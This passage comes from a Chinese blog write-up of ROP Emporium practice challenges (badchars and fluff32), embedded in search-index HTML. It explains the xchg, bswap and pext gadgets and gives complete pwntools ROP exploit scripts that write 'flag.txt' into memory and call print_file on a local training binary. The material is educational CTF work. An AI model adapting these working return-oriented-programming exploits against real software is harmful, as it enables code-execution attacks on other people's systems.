<span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            target_string+=<span class="hljs-built_in">chr</span>(c)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(target_string)==<span class="hljs-number">8</span>:<br>        <span class="hljs-keyword">break</span><br>    <br>    <br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)<br>print_file=elf.plt.print_file<br><br>mov_r13_r12=<span class="hljs-number">0x400634</span><br>pop_r12_r13_r14_15=<span class="hljs-number">0x40069c</span><br>data_addr=<span class="hljs-number">0x601038</span><br><br><br>xor_r15_r14b=<span class="hljs-number">0x400628</span><br>pop_r14_r15=<span class="hljs-number">0x4006a0</span><br><br>payload=junk<br>payload+=p64(pop_r12_r13_r14_15)<br>payload+=target_string.encode()<br>payload+=p64(data_addr)<br>payload+=p64(<span class="hljs-number">0</span>)<br>payload+=p64(<span class="hljs-number">0</span>)<br>payload+=p64(mov_r13_r12)<br><br>pop_rdi=<span class="hljs-number">0x4006a3</span><br><br><span class="hljs-comment">#等数据写入内存后，再通过xor指令来解密，从而绕过badchar检查</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(target_string)):<br>    payload+=p64(pop_r14_r15)<br>    payload+=p64(xor_byte)<br>    payload+=p64(data_addr+i)<br>    payload+=p64(xor_r15_r14b)<br><br><br>payload+=p64(pop_rdi)+p64(data_addr)+p64(print_file) <br><br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># sleep(4)</span><br>io.send(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><h1 id="challenge-6"><a class="markdownIt-Anchor" href="#challenge-6"></a> Challenge 6</h1><h2 id="fluff32"><a class="markdownIt-Anchor" href="#fluff32"></a> fluff32</h2><p>这道题方法上和write基本上相同，但是不同之处是可用gadget的使用更加少了，用ROPgadget找了以后可以发现我们无法找到一个用mov来将数据写入内存的指令，这使得我们在write中用的ROP链无法构造。</p><p>所以要寻找新的方法。</p><p>但是其实作者在文件里给出了提示：</p><p>正是在usefulFunction函数的下面有一些questionableGadgets:</p><p><img src="/posts/716baf74/image-20221106151334860.png" alt="image-20221106151334860"></p><h2 id="xchg指令"><a class="markdownIt-Anchor" href="#xchg指令"></a> xchg指令</h2><p>xchg dl [ecx]</p><p>首先我们来看这个指令，这个指令的意思是交换一个字节内存和寄存器的值，这就可以之前mov的功能了。</p><p>有了这条指令，那么接下来就需要有向edx和ecx写入值的指令了。</p><p>但是用ropgadget找了后发现，没有特别合适的指令。但是恰好作者提供的另外两条指令可以实现这个目的。</p><h3 id="bswap指令"><a class="markdownIt-Anchor" href="#bswap指令"></a> bswap指令</h3><p>这个指令的作用是更改字节序，将大端序的字节转化为小端，小端的转化为大端，举个例子就是，如果我们输入0x11223344,经过这个指令转化后就会变成0x44332211。</p><p><img src="/posts/716baf74/845133_EV6CNVNPDJDFJRJ.png" alt="img"></p><p>而从第一条指令可以看出，我们是将地址存入ecx中，将字符写入edx中，而我们要的字节序是小端（linux)</p><p>所以只需要在存入地址时以大端序存入即可。</p><h3 id="pext指令"><a class="markdownIt-Anchor" href="#pext指令"></a> pext指令</h3><p>PEXT （ Parallel Bits Extract）这条指令根据掩码（第二个源操作数），将源寄存器中对应的bit放到目标寄存器中的低位</p><p>具体如图所示：</p><p><img src="/posts/716baf74/845133_U88RSH7RG75F23K.png" alt="img"></p><p>而根据上面那条提供的包含pext的指令，我们可以发现，src1已经确定了，被存在eax中，是0xbab0baba，所以需要根据我们要的输出确定一下mask，并将其存在ebp中，这条指令会将其放入eax中。</p><p>可以通过下面的这个函数来求出mask的值</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_Mask</span>(<span class="hljs-params">src,output</span>):</span><br>    highBitInOutput=<span class="hljs-number">0</span><br>    hasUsedBitInSrc=<span class="hljs-number">0</span><br>    mask=<span class="hljs-number">0</span><br>    <span class="hljs-comment">#获取输出中的最高有效位</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        <span class="hljs-keyword">if</span>(output&amp;(<span class="hljs-number">1</span>&lt;&lt;i))!=<span class="hljs-number">0</span>:<br>            highBitInOutput=i<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(highBitInOutput+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment">#从末位开始找，直到找到和输出一样的位</span><br>        <span class="hljs-keyword">while</span> output&amp;<span class="hljs-number">1</span> !=src&amp;<span class="hljs-number">1</span>:<br>            src&gt;&gt;=<span class="hljs-number">1</span><br>            hasUsedBitInSrc+=<span class="hljs-number">1</span><br>            <span class="hljs-comment">#无法满足要求</span><br>            <span class="hljs-keyword">if</span> hasUsedBitInSrc==<span class="hljs-number">32</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <br>        <span class="hljs-comment">#找到的话更新mask的值</span><br>        mask|=<span class="hljs-number">1</span>&lt;&lt;(hasUsedBitInSrc) <br><span class="hljs-comment">#右移更新末位</span><br>        output&gt;&gt;=<span class="hljs-number">1</span><br>        src&gt;&gt;=<span class="hljs-number">1</span><br>        hasUsedBitInSrc+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> mask<br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;flag.txt&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(get_Mask(<span class="hljs-number">0xbab0baba</span>,<span class="hljs-built_in">ord</span>(c))))<br></code></pre></div></td></tr></table></figure><p>完整的exp如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># 221106</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./fluff32&#x27;</span>)<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;i386&#x27;</span>, log_level=<span class="hljs-string">&#x27;info&#x27;</span>)<br>io = process(<span class="hljs-string">&#x27;./fluff32&#x27;</span>)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">输入源寄存器和结果,输入mask的值</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_Mask</span>(<span class="hljs-params">src,output</span>):</span><br>    highBitInOutput=<span class="hljs-number">0</span><br>    hasUsedBitInSrc=<span class="hljs-number">0</span><br>    mask=<span class="hljs-number">0</span><br>    <span class="hljs-comment">#获取输出中的最高有效位</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        <span class="hljs-keyword">if</span>(output&amp;(<span class="hljs-number">1</span>&lt;&lt;i))!=<span class="hljs-number">0</span>:<br>            highBitInOutput=i<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(highBitInOutput+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment">#从末位开始找，直到找到和输出一样的位</span><br>        <span class="hljs-keyword">while</span> output&amp;<span class="hljs-number">1</span> !=src&amp;<span class="hljs-number">1</span>:<br>            src&gt;&gt;=<span class="hljs-number">1</span><br>            hasUsedBitInSrc+=<span class="hljs-number">1</span><br>            <span class="hljs-comment">#无法满足要求</span><br>            <span class="hljs-keyword">if</span> hasUsedBitInSrc==<span class="hljs-number">32</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>            <br>        <span class="hljs-comment">#找到的话更新mask的值</span><br>        mask|=<span class="hljs-number">1</span>&lt;&lt;(hasUsedBitInSrc) <br><span class="hljs-comment">#右移更新末位</span><br>        output&gt;&gt;=<span class="hljs-number">1</span><br>        src&gt;&gt;=<span class="hljs-number">1</span><br>        hasUsedBitInSrc+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> mask<br>    <br>junk=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x28</span>+<span class="hljs-number">4</span>)<br>print_file=elf.plt.print_file<br><br>xchg_dl_ecx=<span class="hljs-number">0x8048555</span><br>pop_ecx_bswap_ecx=<span class="hljs-number">0x8048558</span><br>pext_edx_ebx_eax=<span class="hljs-number">0x8048543</span><br>pop_ebp=<span class="hljs-number">0x080485bb</span><br><br><br>data_addr=<span class="hljs-number">0x804a018</span><br><br>target_string=<span class="hljs-string">&#x27;flag.txt&#x27;</span><br><br>payload=junk<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(target_string)):<br>    mask=get_Mask(<span class="hljs-number">0xbab0baba</span>,<span class="hljs-built_in">ord</span>(target_string[i]))<br>    <span class="hljs-comment">#设置ebp的值</span><br>    payload+=p32(pop_ebp)<br>    payload+=p32(mask)<br>    <span class="hljs-comment"># mov eax, ebp；mov ebx, 0B0BABABAh；pext edx, ebx, eax；mov eax, 0DEADBEEFh；retn</span><br>    <span class="hljs-comment">#ebp的值存入eax,然后根据mask的值将edx设置为对应值</span><br>    payload+=p32(pext_edx_ebx_eax)  <br>    <span class="hljs-comment">#pop ecx; bswap dl,[ecx];retn</span><br>    <span class="hljs-comment">#变换ecx的字节序，所以以大端存入，使其变为小端</span><br>    payload+=p32(pop_ecx_bswap_ecx)<br>    payload+=p32(data_addr+i,endianness=<span class="hljs-string">&quot;big&quot;</span>)<br>    <span class="hljs-comment">#交换dl和ecx保存的内存中的值，即将edx中的值存入内存中</span><br>    payload+=p32(xchg_dl_ecx)<br><br><br>payload+=p32(print_file)+p32(<span class="hljs-number">0</span>)+p32(data_addr)<br><br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># sleep(4)</span><br>io.send(payload)<br>io.interactive()<br></code></pre></div></td></tr></table></figure><p>参考了这位佬的题解才做出来</p><p>参考链接：[<a href="https://bbs.pediy.com/thread-272054.htm">原创]writeup-ROP Emporium fluff-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p><h2 id="fluff64"><a class="markdownIt-Anchor" href="#fluff64"></a> fluff64</h2>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
